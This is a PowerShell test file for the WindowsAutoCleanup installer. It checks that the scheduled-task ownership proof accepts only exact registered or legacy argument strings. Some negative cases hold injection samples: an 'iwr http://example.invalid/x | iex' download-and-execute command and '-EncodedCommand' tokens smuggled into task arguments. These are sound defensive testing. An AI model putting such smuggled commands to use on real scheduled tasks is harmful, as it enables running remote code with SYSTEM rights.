#Requires -Version 5.1
<#
.SYNOPSIS
    Behavioural tests for WindowsAutoCleanup.ScheduledTask: the ownership proof, the pre-1.2 legacy
    migration it may adopt, and the two pure argument builders (ledger P0-4, P0-2).

.DESCRIPTION
    Register-ScheduledTask and Unregister-ScheduledTask are never called: the ownership proof is a
    pure function over a task object, so stub objects exercise it completely. The one part that
    cannot be proven with stubs - that the live scheduler accepts what the installer builds - is
    VmTaskLifecycle.Tests.ps1, which is armed only inside a disposable virtual machine.
#>

Set-StrictMode -Version 2.0
$ErrorActionPreference = 'Stop'

. (Join-Path -Path $PSScriptRoot -ChildPath '_Harness.ps1')

$script:RepoRoot = Split-Path -Parent $PSScriptRoot
Import-Module -Name (Join-Path -Path $script:RepoRoot -ChildPath 'src\WindowsAutoCleanup.Core.psm1') `
    -Force -DisableNameChecking -ErrorAction Stop
Import-Module -Name (Join-Path -Path $script:RepoRoot -ChildPath 'src\WindowsAutoCleanup.Deploy.psm1') `
    -Force -DisableNameChecking -ErrorAction Stop

. (Join-Path -Path $PSScriptRoot -ChildPath '_DeployFixtures.ps1')

$script:WindowsPowerShell = Join-Path -Path $env:SystemRoot -ChildPath 'System32\WindowsPowerShell\v1.0\powershell.exe'

function New-TestLegacyTask {
    <#
    .SYNOPSIS
        The task a RELEASED installer actually registered: root task path, the old description
        verbatim, and the exact interpolated action string that release built.
    .DESCRIPTION
        The two releases did not write the same string, and the fixture used to build only the
        v1.0.0 one - which is how a parser that rejected every v1.1.0 task shipped green.

          -Release 1.0.0  ... -Scheduled [ -ResetWindowsUpdateBase]
          -Release 1.1.0  ... -Scheduled -ResetWindowsUpdateBase:$true|$false [ -SkipAclHardening]

        Both bodies are transcribed - not paraphrased - from the installer sources at 8708027 and
        d3d5876. The v1.1.0 format string below is byte-for-byte its line 231 suffix: it is SINGLE
        quoted, so the '$' in '${1}' is a literal character and only '{1}' is substituted. Writing
        ':true' here instead of ':$true' would recreate the exact defect this fixture exists to catch.
    #>
    param(
        [Parameter(Mandatory = $true)][string]$Execute,
        [Parameter(Mandatory = $true)][string]$ScriptPath,
        [ValidateSet('1.0.0', '1.1.0')][string]$Release = '1.0.0',
        [switch]$ResetWindowsUpdateBase,
        [switch]$SkipAclHardening,
        [string]$TaskPath = '\'
    )

    $arguments = '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "{0}" -Scheduled' -f $ScriptPath
    if ($Release -eq '1.1.0') {
        $arguments = '{0} -ResetWindowsUpdateBase:${1}' -f $arguments, ([bool]$ResetWindowsUpdateBase).ToString().ToLowerInvariant()
        if ($SkipAclHardening) { $arguments = '{0} -SkipAclHardening' -f $arguments }
    }
    elseif ($ResetWindowsUpdateBase) {
        $arguments = '{0} -ResetWindowsUpdateBase' -f $arguments
    }

    return (New-StubTask -TaskPath $TaskPath `
        -Description 'Runs WindowsAutoCleanup daily to silently remove explicitly allowed temporary files and cache locations from drive C:.' `
        -Action @(New-StubAction -Execute $Execute -Arguments $arguments -WorkingDirectory (Split-Path -Parent $ScriptPath)))
}

# ---------------------------------------------------------------------------------------------
# Scheduled-task ownership proof (ledger P0-4)
# ---------------------------------------------------------------------------------------------

Test-Case 'Get-WacTaskScriptPath reads the -File argument in both quoted and bare forms' {
    Assert-Equal 'C:\Program Files\WindowsAutoCleanup\Run.ps1' `
        (Get-WacTaskScriptPath -Arguments '-NoProfile -File "C:\Program Files\WindowsAutoCleanup\Run.ps1" -Scheduled')
    Assert-Equal 'C:\Wac\Run.ps1' (Get-WacTaskScriptPath -Arguments '-NoProfile -File C:\Wac\Run.ps1 -Scheduled')
    Assert-Equal $null (Get-WacTaskScriptPath -Arguments '-NoProfile -Command Get-Date')
    Assert-Equal $null (Get-WacTaskScriptPath -Arguments '')
    Assert-Equal $null (Get-WacTaskScriptPath -Arguments '-NoProfile -Filesystem C:\Wac\Run.ps1')
}

Test-Case 'Test-WacTaskIsOurs accepts every argument string this version can register, and only those' {
    Invoke-InDeploymentSandbox -Prefix 'task-ours' -Body {
        param($sandbox)

        $null = $sandbox
        $root = Get-WacNormalizedPath -Path (Get-WacDeploymentRoot)
        $runScript = Join-Path -Path $root -ChildPath 'Run.ps1'
        $candidates = @(Get-WacTaskActionArgumentCandidate -RunScript $runScript)

        Assert-Equal 8 $candidates.Count 'three independent switches produce eight registrable argument strings'
        Assert-Equal 8 @($candidates | Sort-Object -Unique).Count 'two switch combinations collapsed to the same string'

        foreach ($arguments in $candidates) {
            $task = New-StubTask -TaskPath (Get-WacTaskFolder) -Description ('anything ' + (Get-WacTaskSentinel)) `
                -Action @((New-StubAction -Execute $script:WindowsPowerShell -Arguments $arguments -WorkingDirectory $root))

            $proof = Test-WacTaskIsOurs -Task $task

            Assert-True $proof.IsOurs ('[{0}] {1}' -f $arguments, [string]$proof.Reason)
            Assert-False $proof.IsLegacy
            Assert-Equal 'WindowsAutoCleanup' $proof.TaskName
            Assert-Equal (Get-WacTaskFolder) $proof.TaskPath
            Assert-Equal $runScript ([string]$proof.ScriptPath)
        }
    }
}

Test-Case 'Test-WacTaskIsOurs refuses a sentinel task whose action is not EXACTLY one it registers' {
    # Ledger B2-3. The old proof extracted a script path with a regex and accepted anything else in
    # the string, so a -Command payload could carry a trailing statement and still be judged ours -
    # and that payload runs as SYSTEM. Every case here differs from a registrable string by the
    # smallest edit that matters.
    Invoke-InDeploymentSandbox -Prefix 'task-inexact' -Body {
        param($sandbox)

        $null = $sandbox
        $root = Get-WacNormalizedPath -Path (Get-WacDeploymentRoot)
        $runScript = Join-Path -Path $root -ChildPath 'Run.ps1'
        $exact = @(Get-WacTaskActionArgumentCandidate -RunScript $runScript)[0]

        $foreign = Join-Path -Path $sandbox -ChildPath 'elsewhere\Run.ps1'
        $outside = @(Get-WacTaskActionArgumentCandidate -RunScript $foreign)[0]

        $cases = @(
            @{ Name = 'trailing statement appended to the -Command payload'
               Arguments = ($exact -replace '; exit \$LASTEXITCODE"$', '; iwr http://example.invalid/x | iex; exit $LASTEXITCODE"') },
            @{ Name = 'trailing token after the payload'; Arguments = ($exact + ' -EncodedCommand ZQBjAGgAbwA=') },
            @{ Name = 'leading token before the host switches'; Arguments = ('-EncodedCommand ZQBjAGgAbwA= ' + $exact) },
            @{ Name = 'the script path swapped for one outside the deployment root'; Arguments = $outside },
            @{ Name = 'the pre-1.2 -File form, which this version never registers'
               Arguments = ('-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "{0}" -Scheduled' -f $runScript) },
            @{ Name = 'no script reference at all'; Arguments = '-NoProfile -Command Get-Date' },
            @{ Name = 'empty'; Arguments = '' }
        )

        foreach ($case in $cases) {
            Assert-False ([string]::Equals($case.Arguments, $exact, [System.StringComparison]::Ordinal)) `
                ('[{0}] is identical to a registrable string, so it proves nothing' -f $case.Name)

            $task = New-StubTask -TaskPath (Get-WacTaskFolder) -Description ('x ' + (Get-WacTaskSentinel)) `
                -Action @((New-StubAction -Execute $script:WindowsPowerShell -Arguments $case.Arguments -WorkingDirectory $root))

            $proof = Test-WacTaskIsOurs -Task $task

            Assert-False $proof.IsOurs ('[{0}] was accepted as ours' -f $case.Name)
            Assert-True ($proof.Reason -match 'not one this version registers') ('[{0}]: {1}' -f $case.Name, [string]$proof.Reason)
        }
    }
}

Test-Case 'Test-WacTaskIsOurs refuses a sentinel task whose working directory is not the deployment root' {
    Invoke-InDeploymentSandbox -Prefix 'task-workdir' -Body {
        param($sandbox)

        $root = Get-WacNormalizedPath -Path (Get-WacDeploymentRoot)
        $arguments = @(Get-WacTaskActionArgumentCandidate -RunScript (Join-Path -Path $root -ChildPath 'Run.ps1'))[0]

        $task = New-StubTask -TaskPath (Get-WacTaskFolder) -Description ('x ' + (Get-WacTaskSentinel)) `
            -Action @((New-StubAction -Execute $script:WindowsPowerShell -Arguments $arguments -WorkingDirectory $sandbox))

        $proof = Test-WacTaskIsOurs -Task $task

        Assert-False $proof.IsOurs 'a task whose action starts in someone else''s directory was accepted'
        Assert-True ($proof.Reason -match 'working directory') ([string]$proof.Reason)
    }
}

Test-Case 'Test-WacTaskIsOurs rejects a foreign task that merely shares our name' {
    Invoke-InDeploymentSandbox -Prefix 'task-foreign' -Body {
        param($sandbox)

        $null = $sandbox
        $arguments = '-NoProfile -File "{0}" -Scheduled' -f (Join-Path -Path (Get-WacDeploymentRoot) -ChildPath 'Run.ps1')
        $task = New-StubTask -TaskPath (Get-WacTaskFolder) -Description 'Some other daily job' `
            -Action @((New-StubAction -Execute $script:WindowsPowerShell -Arguments $arguments))

        $proof = Test-WacTaskIsOurs -Task $task

        Assert-False $proof.IsOurs
        Assert-True ($proof.Reason -match 'sentinel') ([string]$proof.Reason)
    }
}

Test-Case 'Test-WacTaskIsOurs rejects a PATH-resolved executable' {
    Invoke-InDeploymentSandbox -Prefix 'task-path' -Body {
        param($sandbox)

        $null = $sandbox
        $arguments = @(Get-WacTaskActionArgumentCandidate -RunScript (Join-Path -Path (Get-WacDeploymentRoot) -ChildPath 'Run.ps1'))[0]
        $sentinel = 'x ' + (Get-WacTaskSentinel)

        foreach ($executable in @('pwsh.exe', 'powershell.exe', 'wt.exe', 'C:pwsh.exe', '', '\\server\share\pwsh.exe')) {
            $task = New-StubTask -TaskPath (Get-WacTaskFolder) -Description $sentinel `
                -Action @((New-StubAction -Execute $executable -Arguments $arguments))

            $proof = Test-WacTaskIsOurs -Task $task

            Assert-False $proof.IsOurs ('[{0}] was accepted as a rooted local host' -f $executable)
            Assert-True ($proof.Reason -match 'rooted local path') ([string]$proof.Reason)
        }
    }
}

Test-Case 'Test-WacTaskIsOurs rejects a task that does not have exactly one action' {
    Invoke-InDeploymentSandbox -Prefix 'task-actions' -Body {
        param($sandbox)

        $null = $sandbox
        $arguments = @(Get-WacTaskActionArgumentCandidate -RunScript (Join-Path -Path (Get-WacDeploymentRoot) -ChildPath 'Run.ps1'))[0]
        $action = New-StubAction -Execute $script:WindowsPowerShell -Arguments $arguments
        $sentinel = 'x ' + (Get-WacTaskSentinel)

        $multi = Test-WacTaskIsOurs -Task (New-StubTask -TaskPath (Get-WacTaskFolder) -Description $sentinel -Action @($action, $action))
        Assert-False $multi.IsOurs 'a two-action task was accepted'
        Assert-True ($multi.Reason -match '2 actions') ([string]$multi.Reason)

        $none = Test-WacTaskIsOurs -Task (New-StubTask -TaskPath (Get-WacTaskFolder) -Description $sentinel -Action @())
        Assert-False $none.IsOurs 'an action-less task was accepted'
        Assert-True ($none.Reason -match '0 actions') ([string]$none.Reason)
    }
}

Test-Case 'Test-WacTaskIsOurs adopts the exact pre-1.2 task, whatever host it was pointed at' {
    # The measured pre-1.2 registration. Its host came from `Get-Command pwsh.exe`, so on a machine
    # with a PORTABLE PowerShell it is a PATH-resolved binary on a secondary drive - which is the
    # whole reason the old task is dangerous and has to be removed. Demanding a canonical Execute
    # here would refuse it, leave the vulnerable registration running, and add a second task beside
    # it. Both shapes are asserted, because covering only the canonical one is exactly the mistake.
    Invoke-InDeploymentSandbox -Prefix 'task-legacy' -Body {
        param($sandbox)

        $null = $sandbox
        $legacyScript = 'C:\Users\me\WindowsAutoCleanup\Run.ps1'

        $hosts = @(
            @{ Name = 'canonical Windows PowerShell'; Execute = $script:WindowsPowerShell },
            @{ Name = 'portable pwsh on a secondary drive'; Execute = 'D:\Portable\PowerShell\pwsh.exe' },
            @{ Name = 'PATH-resolved pwsh.exe'; Execute = 'pwsh.exe' }
        )

        # Every argument string a released installer could emit. v1.1.0 - the version the upgrade
        # notes tell people to upgrade FROM - never wrote the bare -ResetWindowsUpdateBase switch,
        # so covering only the v1.0.0 shapes is what let a parser that refuses every v1.1.0 task
        # ship green.
        $shapes = @(
            @{ Name = 'v1.0.0, no -ResetWindowsUpdateBase';     Release = '1.0.0'; Reset = $false; SkipAcl = $false },
            @{ Name = 'v1.0.0, bare -ResetWindowsUpdateBase';   Release = '1.0.0'; Reset = $true;  SkipAcl = $false },
            @{ Name = 'v1.1.0, -ResetWindowsUpdateBase:$true';  Release = '1.1.0'; Reset = $true;  SkipAcl = $false },
            @{ Name = 'v1.1.0, -ResetWindowsUpdateBase:$false'; Release = '1.1.0'; Reset = $false; SkipAcl = $false },
            @{ Name = 'v1.1.0, :$true -SkipAclHardening';       Release = '1.1.0'; Reset = $true;  SkipAcl = $true },
            @{ Name = 'v1.1.0, :$false -SkipAclHardening';      Release = '1.1.0'; Reset = $false; SkipAcl = $true }
        )

        foreach ($entry in $hosts) {
            foreach ($shape in $shapes) {
                $task = New-TestLegacyTask -Execute $entry.Execute -ScriptPath $legacyScript `
                    -Release $shape.Release -ResetWindowsUpdateBase:$shape.Reset -SkipAclHardening:$shape.SkipAcl
                $label = '[{0} / {1}]' -f $entry.Name, $shape.Name

                $refused = Test-WacTaskIsOurs -Task $task
                Assert-False $refused.IsOurs ('{0} was adopted without -AllowLegacyMigration' -f $label)
                Assert-True ($refused.Reason -match 'sentinel') ([string]$refused.Reason)

                $adopted = Test-WacTaskIsOurs -Task $task -AllowLegacyMigration
                Assert-True $adopted.IsOurs ('{0}: {1}' -f $label, [string]$adopted.Reason)
                Assert-True $adopted.IsLegacy 'an adopted pre-1.2 task must be flagged legacy'
                Assert-Equal $legacyScript ([string]$adopted.ScriptPath)
                Assert-Equal '\' $adopted.TaskPath
            }
        }
    }
}

Test-Case 'Test-WacTaskIsOurs refuses every near-miss legacy task' {
    Invoke-InDeploymentSandbox -Prefix 'task-legacy-miss' -Body {
        param($sandbox)

        $null = $sandbox
        $description = 'Runs WindowsAutoCleanup daily to silently remove explicitly allowed temporary files and cache locations from drive C:.'
        $good = '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\Users\me\WindowsAutoCleanup\Run.ps1" -Scheduled'
        # The v1.1.0 body, which IS adopted. Every near-miss below is one token away from it, so the
        # widened pattern cannot have been widened into a permissive match.
        $released11 = $good + ' -ResetWindowsUpdateBase:$true'

        $cases = @(
            @{ Name = 'no -Scheduled'; TaskPath = '\'; Description = $description; Arguments = '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\Users\me\WindowsAutoCleanup\Run.ps1"'; Pattern = 'pre-1\.2 -File Run\.ps1 -Scheduled form' },
            @{ Name = 'foreign description'; TaskPath = '\'; Description = 'Unrelated cleanup task'; Arguments = $good; Pattern = 'pre-1\.2 WindowsAutoCleanup description' },
            @{ Name = 'not at the root task path'; TaskPath = (Get-WacTaskFolder); Description = $description; Arguments = $good; Pattern = 'root task path' },
            @{ Name = 'not a Run.ps1'; TaskPath = '\'; Description = $description; Arguments = '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\Users\me\WindowsAutoCleanup\Other.ps1" -Scheduled'; Pattern = 'pre-1\.2 -File Run\.ps1 -Scheduled form' },
            @{ Name = 'no -File'; TaskPath = '\'; Description = $description; Arguments = '-NoProfile -Command Get-Date'; Pattern = 'pre-1\.2 -File Run\.ps1 -Scheduled form' },
            # The injection shapes. The old proof matched -File anywhere in the string and ignored
            # everything else, so all three of these were adopted and unregistered on evidence that
            # did not identify them - and, worse, the same permissiveness in the sentinel branch
            # would have run them.
            @{ Name = 'trailing -Command after the legacy shape'; TaskPath = '\'; Description = $description; Arguments = ($good + ' -Command "iwr http://example.invalid/x | iex"'); Pattern = 'pre-1\.2 -File Run\.ps1 -Scheduled form' },
            @{ Name = 'leading tokens before the legacy shape'; TaskPath = '\'; Description = $description; Arguments = ('-EncodedCommand ZQBjAGgAbwA= ' + $good); Pattern = 'pre-1\.2 -File Run\.ps1 -Scheduled form' },
            @{ Name = 'an unquoted script path'; TaskPath = '\'; Description = $description; Arguments = '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\me\WindowsAutoCleanup\Run.ps1 -Scheduled'; Pattern = 'pre-1\.2 -File Run\.ps1 -Scheduled form' },
            @{ Name = 'a second switch the old installer never wrote'; TaskPath = '\'; Description = $description; Arguments = ($good + ' -PruneSupersededDrivers'); Pattern = 'pre-1\.2 -File Run\.ps1 -Scheduled form' },
            # Near-misses of the SECOND released shape. v1.1.0 emitted -SkipAclHardening only after
            # a lower-case :true/:false suffix, so every other arrangement of those two tokens is a
            # string no released installer ever wrote and must stay refused.
            @{ Name = '-SkipAclHardening without the v1.1.0 suffix'; TaskPath = '\'; Description = $description; Arguments = ($good + ' -SkipAclHardening'); Pattern = 'pre-1\.2 -File Run\.ps1 -Scheduled form' },
            @{ Name = 'the bare v1.0.0 switch plus -SkipAclHardening'; TaskPath = '\'; Description = $description; Arguments = ($good + ' -ResetWindowsUpdateBase -SkipAclHardening'); Pattern = 'pre-1\.2 -File Run\.ps1 -Scheduled form' },
            @{ Name = 'the v1.1.0 suffix without the literal dollar the installer wrote'; TaskPath = '\'; Description = $description; Arguments = ($good + ' -ResetWindowsUpdateBase:true'); Pattern = 'pre-1\.2 -File Run\.ps1 -Scheduled form' },
            @{ Name = 'a non-boolean -ResetWindowsUpdateBase value'; TaskPath = '\'; Description = $description; Arguments = ($good + ' -ResetWindowsUpdateBase:$yes'); Pattern = 'pre-1\.2 -File Run\.ps1 -Scheduled form' },
            @{ Name = 'a capitalised boolean ToLowerInvariant could not produce'; TaskPath = '\'; Description = $description; Arguments = ($good + ' -ResetWindowsUpdateBase:$True'); Pattern = 'pre-1\.2 -File Run\.ps1 -Scheduled form' },
            @{ Name = 'trailing -Command after the v1.1.0 shape'; TaskPath = '\'; Description = $description; Arguments = ($released11 + ' -Command "iwr http://example.invalid/x | iex"'); Pattern = 'pre-1\.2 -File Run\.ps1 -Scheduled form' },
            @{ Name = 'a second switch appended to the v1.1.0 shape'; TaskPath = '\'; Description = $description; Arguments = ($released11 + ' -PruneSupersededDrivers'); Pattern = 'pre-1\.2 -File Run\.ps1 -Scheduled form' }
        )

        foreach ($case in $cases) {
            $task = New-StubTask -TaskPath $case.TaskPath -Description $case.Description `
                -Action @((New-StubAction -Execute $script:WindowsPowerShell -Arguments $case.Arguments))

            $proof = Test-WacTaskIsOurs -Task $task -AllowLegacyMigration

            Assert-False $proof.IsOurs ('legacy migration accepted [{0}]' -f $case.Name)
            Assert-True ($proof.Reason -match $case.Pattern) ('[{0}]: {1}' -f $case.Name, $proof.Reason)
        }
    }
}

Test-Case 'Test-WacTaskIsOurs honours an explicitly supplied deployment root' {
    $arguments = @(Get-WacTaskActionArgumentCandidate -RunScript 'C:\Custom\Deployment\Run.ps1')[0]
    $task = New-StubTask -TaskPath (Get-WacTaskFolder) -Description ('x ' + (Get-WacTaskSentinel)) `
        -Action @((New-StubAction -Execute $script:WindowsPowerShell -Arguments $arguments -WorkingDirectory 'C:\Custom\Deployment'))

    $matched = Test-WacTaskIsOurs -Task $task -DeploymentRoot 'C:\Custom\Deployment'
    Assert-True $matched.IsOurs ([string]$matched.Reason)

    $mismatched = Test-WacTaskIsOurs -Task $task -DeploymentRoot 'C:\Custom\Other'
    Assert-False $mismatched.IsOurs 'the supplied deployment root was ignored'
}

Test-Case 'Test-WacTaskReferencesRoot finds the deployment named anywhere in an action' {
    # What stops the uninstaller deleting the tree under a task it deliberately left alone. Each
    # case hides the path in a DIFFERENT member, because covering only the parsed script argument
    # leaves the executable and the working directory able to point at the tree unnoticed.
    $root = 'C:\Program Files\WindowsAutoCleanup'
    $inside = Join-Path -Path $root -ChildPath 'Run.ps1'

    $hits = @(
        @{ Name = 'in the -File argument'; Action = (New-StubAction -Execute $script:WindowsPowerShell -Arguments ('-File "{0}" -Scheduled' -f $inside)) },
        @{ Name = 'in the -Command payload'; Action = (New-StubAction -Execute $script:WindowsPowerShell -Arguments ("-Command ""& '{0}' -Scheduled""" -f $inside)) },
        @{ Name = 'as the executable itself'; Action = (New-StubAction -Execute (Join-Path -Path $root -ChildPath 'tool.exe') -Arguments '') },
        @{ Name = 'as the working directory'; Action = (New-StubAction -Execute $script:WindowsPowerShell -Arguments '-Command Get-Date' -WorkingDirectory $root) }
    )

    foreach ($case in $hits) {
        $task = New-StubTask -TaskPath '\Other\' -Description 'someone else' -Action @($case.Action)
        Assert-True (Test-WacTaskReferencesRoot -Task @($task) -DeploymentRoot $root) `
            ('a task referencing the deployment [{0}] was not detected, so its files would be deleted under it' -f $case.Name)
    }

    $elsewhere = New-StubTask -TaskPath '\Other\' -Description 'someone else' `
        -Action @((New-StubAction -Execute $script:WindowsPowerShell -Arguments '-File "C:\Other\Thing.ps1"' -WorkingDirectory 'C:\Other'))
    Assert-False (Test-WacTaskReferencesRoot -Task @($elsewhere) -DeploymentRoot $root) `
        'an unrelated task blocked the deployment removal, which would make uninstall impossible'
    Assert-False (Test-WacTaskReferencesRoot -Task @() -DeploymentRoot $root) 'no tasks at all must not block removal'
    Assert-False (Test-WacTaskReferencesRoot -Task @($null) -DeploymentRoot $root) 'a null entry must not block removal'
}

Test-Case 'Get-WacTaskDescription always carries the sentinel Test-WacTaskIsOurs looks for' {
    $description = Get-WacTaskDescription
    Assert-True $description.Contains((Get-WacTaskSentinel)) $description
    Assert-Equal 'WindowsAutoCleanup' (Get-WacTaskName)
    Assert-Equal '\WindowsAutoCleanup\' (Get-WacTaskFolder)
}

# ---------------------------------------------------------------------------------------------
# Argument vectors (ledger P0-2)
# ---------------------------------------------------------------------------------------------

Test-Case 'Get-WacInstallerRelaunchArgument emits -ResetWindowsUpdateBase:$false explicitly' {
    $vector = Get-WacInstallerRelaunchArgument -ScriptPath 'C:\a b\Install.ps1' -DailyRunTime '03:00' `
        -ResetWindowsUpdateBase $false -EnableLegacyDiskCleanup -NoPause

    # -Command, not -File: Windows PowerShell 5.1 cannot bind -Switch:$false under -File at all, and
    # the installer relaunches through powershell.exe whenever PowerShell 7 is absent.
    # Build the payload OUTSIDE the array literal. Inside @( ), a newline separates elements even
    # after a trailing '+', so writing the concatenation inline silently yields two elements.
    # The payload seeds $LASTEXITCODE before calling the script: a child that never ran at all
    # leaves it undefined, and `exit $null` is exit 0 - a total failure reported as success.
    $payloadText = "`$LASTEXITCODE = 1; & 'C:\a b\Install.ps1' -ResetWindowsUpdateBase:`$false " +
        "-EnableLegacyDiskCleanup -NoPause -DailyRunTime '03:00'; exit `$LASTEXITCODE"
    $expected = @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', $payloadText)

    Assert-Equal $expected.Count @($vector).Count (($vector) -join ' ')
    for ($i = 0; $i -lt $expected.Count; $i++) {
        Assert-Equal $expected[$i] ([string]$vector[$i]) ('element {0}' -f $i)
    }

    $payload = [string]$vector[4]
    Assert-False ([regex]::IsMatch($payload, '(?<![\w:$])-ResetWindowsUpdateBase(?![\w:])')) `
        'the bare switch form would let the child re-apply its own default'
    Assert-False ($payload.Contains('-PruneSupersededDrivers')) 'a switch the caller never passed was forwarded'
}

Test-Case 'Get-WacInstallerRelaunchArgument defaults ResetWindowsUpdateBase to an explicit $true' {
    $vector = Get-WacInstallerRelaunchArgument -ScriptPath 'C:\Install.ps1' -DailyRunTime '20:00'

    $payload = [string]$vector[4]
    Assert-True ($payload.Contains('-ResetWindowsUpdateBase:$true')) (($vector) -join ' ')
    Assert-False ([regex]::IsMatch($payload, '(?<![\w:$])-ResetWindowsUpdateBase(?![\w:])')) $payload
    Assert-False ($payload.Contains('-NoPause')) $payload
    Assert-True ($payload.Contains("-DailyRunTime '20:00'")) $payload
}

Test-Case 'The relaunch vector survives quoting into a command line with spaces in the path' {
    $vector = Get-WacInstallerRelaunchArgument -ScriptPath 'C:\a b\Install.ps1' -DailyRunTime '03:00' `
        -ResetWindowsUpdateBase $false -NoPause

    $commandLine = ConvertTo-WacCommandLine -ArgumentList $vector

    # Two quoting layers, each applied once: single quotes for the PowerShell parser inside the
    # payload, double quotes around the payload for CreateProcess.
    $expected = '-NoProfile -ExecutionPolicy Bypass -Command ' +
        '"$LASTEXITCODE = 1; & ' + "'C:\a b\Install.ps1'" + ' -ResetWindowsUpdateBase:$false -NoPause ' +
        "-DailyRunTime '03:00'; exit " + '$LASTEXITCODE"'
    Assert-Equal $expected $commandLine
}

Test-Case 'The relaunch vector is a plain string array, so Start-Process cannot re-interpret it' {
    $vector = Get-WacInstallerRelaunchArgument -ScriptPath 'C:\Install.ps1' -DailyRunTime '03:00'

    Assert-True (@($vector).Count -gt 0)
    foreach ($item in $vector) {
        Assert-True ($item -is [string]) ('element type was {0}' -f $item.GetType().FullName)
    }
}

Test-Case 'Get-WacTaskActionArgument builds the exact argument string the task will run' {
    $arguments = Get-WacTaskActionArgument -RunScript 'C:\Program Files\WindowsAutoCleanup\Run.ps1' -ResetWindowsUpdateBase $false

    $expected = '-NoProfile -ExecutionPolicy Bypass -NonInteractive -WindowStyle Hidden -Command ' +
        '"$LASTEXITCODE = 1; & ' + "'C:\Program Files\WindowsAutoCleanup\Run.ps1'" +
        ' -ResetWindowsUpdateBase:$false -Scheduled; exit $LASTEXITCODE"'
    Assert-Equal $expected $arguments
}

Test-Case 'Get-WacTaskActionArgument forwards only the opt-ins the caller actually passed' {
    $none = Get-WacTaskActionArgument -RunScript 'C:\Wac\Run.ps1' -ResetWindowsUpdateBase $true
    Assert-True ($none -match [regex]::Escape('-ResetWindowsUpdateBase:$true')) $none
    Assert-False ($none -match 'PruneSupersededDrivers') $none
    Assert-False ($none -match 'EnableLegacyDiskCleanup') $none

    $all = Get-WacTaskActionArgument -RunScript 'C:\Wac\Run.ps1' -ResetWindowsUpdateBase $true `
        -PruneSupersededDrivers -EnableLegacyDiskCleanup
    Assert-True ($all -match 'PruneSupersededDrivers') $all
    Assert-True ($all -match 'EnableLegacyDiskCleanup') $all

    $ownership = Get-WacTaskScriptPath -Arguments $all
    Assert-Equal 'C:\Wac\Run.ps1' $ownership 'the action string must round-trip through the ownership parser'
}

Complete-TestRun
